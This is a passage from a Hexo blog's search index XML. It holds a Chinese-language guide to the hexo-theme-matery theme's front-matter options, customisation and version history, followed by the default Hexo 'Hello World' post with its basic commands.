<code>true</code>，则会作为首页推荐文章</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr></tbody></table></div><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2" target="_blank" rel="noopener">开源中国在线工具</a>、<a href="http://encode.chahuo.com/" target="_blank" rel="noopener">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx" target="_blank" rel="noopener">站长工具</a>。</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h3 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h3><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00---</code></pre><h3 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h3><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: /source/images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---</code></pre><h2 id="效果截图"><a href="#效果截图" class="headerlink" title="效果截图"></a>效果截图</h2><p><img src="http://static.blinkfox.com/matery-20181202-1.png" alt="首页"></p><p><img src="http://static.blinkfox.com/matery-20181202-2.png" alt="首页推荐文章"></p><p><img src="http://static.blinkfox.com/matery-20181202-3.png" alt="首页文章列表"></p><p><img src="http://static.blinkfox.com/matery-20181202-7.png" alt="首页文章列表"></p><p><img src="http://static.blinkfox.com/matery-20181202-8.png" alt="首页文章列表"></p><h2 id="自定制修改"><a href="#自定制修改" class="headerlink" title="自定制修改"></a>自定制修改</h2><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p><ul><li>菜单</li><li>我的梦想</li><li>首页的音乐播放器和视频播放器配置</li><li>是否显示推荐文章名称和按钮配置</li><li><code>favicon</code> 和 <code>Logo</code></li><li>个人信息</li><li>TOC 目录</li><li>文章打赏信息</li><li>复制文章内容时追加版权信息</li><li>MathJax</li><li>文章字数统计、阅读时长</li><li>点击页面的’爱心’效果</li><li>我的项目</li><li>我的技能</li><li>我的相册</li><li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li><li><a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li><li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li></ul><p><strong>我认为个人博客应该都有自己的风格和特色</strong>。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 <code>_config.yml</code> 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p><h3 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h3><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p><pre class=" language-lang-css"><code class="language-lang-css">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */.bg-color {    background-image: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%);}@-webkit-keyframes rainbow {   /* 动态切换背景颜色. */}@keyframes rainbow {    /* 动态切换背景颜色. */}</code></pre><h3 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="修改 banner 图和文章特色图"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p><pre class=" language-lang-javascript"><code class="language-lang-javascript">$('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');</code></pre><p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p><h2 id="版本记录"><a href="#版本记录" class="headerlink" title="版本记录"></a>版本记录</h2><ul><li>v1.0.0<ul><li>新增了所有基础功能；</li></ul></li><li>v1.0.1<ul><li>调整 <code>css</code>、<code>js</code> 的文件请求路径在主题的<code>_config.yml</code>中配置，便于你更快捷的配置自己的 CDN；</li><li>新增代码是否折行为可配置，默认为折行；</li><li>默认激活 <code>TOC</code> 功能，并新增为某篇文章关闭 <code>TOC</code> 的 <code>Front-matter</code> 配置选项；</li><li>修复文章滚动时，高亮的目录选项不准确的问题；</li><li><code>IOS</code>下移除搜索框自动获得焦点属性，防止自动获得焦点后导致视图上移；</li></ul></li><li>v1.0.2<ul><li>升级了 <a href="https://materializecss.com/" target="_blank" rel="noopener">Materialize</a> 框架版本为<code>1.0.0</code>，重构和修改了升级过程中的部分文件或问题；</li><li>新增了首页封面的全屏轮播特效，可以将更重要的文章设置到首页轮播中；</li><li>修复首页第一个按钮是中文的问题</li><li>修复了 iPhone 上点击搜索输入获取焦点的问题；</li><li>修复了 iPhone 上输入框获取焦点后页面放大的问题；</li><li>修复一些文章或 UI 显示问题；</li></ul></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> hexo-theme-matery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/09/13/hello-world/"/>
      <url>/2018/09/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo new "My New Post"</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
